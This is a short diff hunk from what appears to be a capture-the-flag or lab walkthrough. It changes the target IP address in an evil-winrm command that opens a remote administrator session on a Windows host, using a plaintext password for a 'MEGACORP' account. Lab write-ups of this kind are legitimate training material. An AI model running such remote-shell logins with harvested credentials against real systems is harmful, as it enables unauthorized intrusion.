@@ -520,7 +520,7 @@ C:\Windows\system32>
 ### Using evil-winrm
 
 ```awk
-evil-winrm -i 10.129.228.29 -u administrator -p 'MEGACORP_4dm1n!!'
+evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
 ```
 
 ```
